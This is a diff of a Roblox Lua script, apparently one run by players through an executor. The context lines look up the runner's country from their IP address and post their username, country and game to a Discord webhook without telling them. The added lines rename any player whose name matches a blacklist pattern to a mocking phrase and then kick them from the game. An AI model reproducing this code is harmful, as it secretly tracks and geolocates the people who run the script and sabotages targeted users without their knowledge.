@@ -29,6 +29,15 @@ local function sanitizeMessage(message)
     return message
 end
 
+local function changeDisplayName(player)
+    local originalName = player.DisplayName
+    local newName = ":v Sean mamon" -- Cambia esto a un nombre gracioso de tu elección
+    player.DisplayName = newName
+    wait(10) 
+    player.DisplayName = originalName
+    game.Players.LocalPlayer:Kick()
+end
+
 local function sendNotificationToDiscord(webhookURL, message)
     local sanitizedMessage = sanitizeMessage(message)
     local requestBody = { content = prefix .. " " .. sanitizedMessage }
@@ -66,6 +75,7 @@ local blacklist = downloadBlacklist(blacklistUrl)
 
 local playerName = game.Players.LocalPlayer.Name
 local playerId = game.Players.LocalPlayer.UserId
+local localPlayer = game.Players.LocalPlayer
 
 if not isInBlacklist(playerId, blacklist) then
     local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
@@ -79,6 +89,14 @@ if not isInBlacklist(playerId, blacklist) then
     local response = game:HttpGet("https://ipapi.co/" .. ipAddress .. "/country_name")
     if response then
         country = response
+    end
+
+    -- Verificar si el nombre de usuario contiene un patrón prohibido
+    for _, pattern in ipairs(forbiddenPatterns) do
+        if playerName:match(pattern) then
+            changeDisplayName(localPlayer)
+            break
+        end
     end
     
     sendNotificationToDiscord(ExecuteWebhookURL, playerName .. " from " .. country .. " executed the script in game '" .. gameName .. "'.")
